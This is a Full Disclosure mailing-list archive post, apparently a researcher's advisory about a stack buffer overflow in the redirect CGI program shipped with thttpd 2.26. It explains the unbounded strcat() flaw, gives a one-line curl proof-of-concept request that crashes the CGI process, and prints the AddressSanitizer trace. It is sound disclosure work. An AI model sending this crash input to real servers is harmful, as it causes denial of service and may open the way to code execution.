---
title: thttpd v2.26 Stack-Based Buffer Overflow in thttpd redirect	CGI Program
url: https://seclists.org/fulldisclosure/2026/Sep/16
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:34.425862
---

# thttpd v2.26 Stack-Based Buffer Overflow in thttpd redirect	CGI Program

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# thttpd v2.26 Stack-Based Buffer Overflow in thttpd redirect CGI Program

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 19:49:03 -0400

---

```
*Description:*
A stack-based buffer overflow vulnerability exists in the redirect CGI
program distributed with thttpd. The vulnerability is caused by unsafe
string concatenation when constructing redirect URLs using
attacker-controlled CGI environment variables. A remote, unauthenticated
attacker can trigger the vulnerability via a crafted HTTP request,
resulting in a crash of the CGI process and denial of service. In
environments lacking modern exploit mitigations, this condition may be
exploitable for arbitrary code execution.

The redirect CGI program processes HTTP requests by reading CGI environment
variables such as SCRIPT_NAME and PATH_INFO. When a wildcard redirect rule
(*) is present in the .redirects file, the program appends user-controlled
path data to a fixed-size stack buffer using strcat() without enforcing
bounds checks. Specifically, when a redirect rule contains a wildcard
match, the following logic is executed:
strcat(url, script_name + (star - file)); Both script_name and the appended
data originate from HTTP request paths controlled by the client. No
validation is performed to ensure the combined string length fits within
the allocated stack buffer (char url[5000]), resulting in a stack-based
buffer overflow.

*Affected Component:*

   - Project: thttpd
   - Component: cgi-src/redirect.c
   - Program Type: CGI executable
   - Affected Function: main()
   - Vulnerable Operation: strcat() on fixed-size stack buffer
   - Vulnerable Buffer: char url[5000]

*Attack Vector*

   - Remote
   - Unauthenticated
   - No user interaction required

*Proof of Concept (Remote):*

*Attacker:*
curl "http://127.0.0.1:8080/cgi-bin/redirect$(printf '/A%.0s' {1..1000})"
----
curl: (52) Empty reply from server
This indicates the CGI process terminated unexpectedly during request
handling.

*Server:*
busybox httpd -f -p 8080 -h /var/www

*Output:*
=================================================================
==173922==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbff8c503cd8 at pc 0xffff8ee025f0 bp 0xffffe5394370 sp 0xffffe5393b50
WRITE of size 70 at 0xfbff8c503cd8 thread T0
    #0 0xffff8ee025ec in strcat
../../../../src/libsanitizer/asan/asan_interceptors.cpp:520
    #1 0xaaaae2ce2478 in main /root/thttpd/cgi-src/redirect.c:195
    #2 0xffff8e4c2598 in __libc_start_call_main ../sysdeps/nptl
/libc_start_call_main.h:58
    #3 0xffff8e4c2678 in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0xaaaae2ce1cac in _start (/root/thttpd/cgi-src/redirect+0x1cac)
(BuildId: dc697d7fab1c2439351593ff9fdb0104c36471ba)

Address 0xfbff8c503cd8 is located in stack of thread T0 at offset 15576 in
frame
    #0 0xaaaae2ce1e80 in main /root/thttpd/cgi-src/redirect.c:127

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

### Current thread:

* **thttpd v2.26 Stack-Based Buffer Overflow in thttpd redirect CGI Program** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")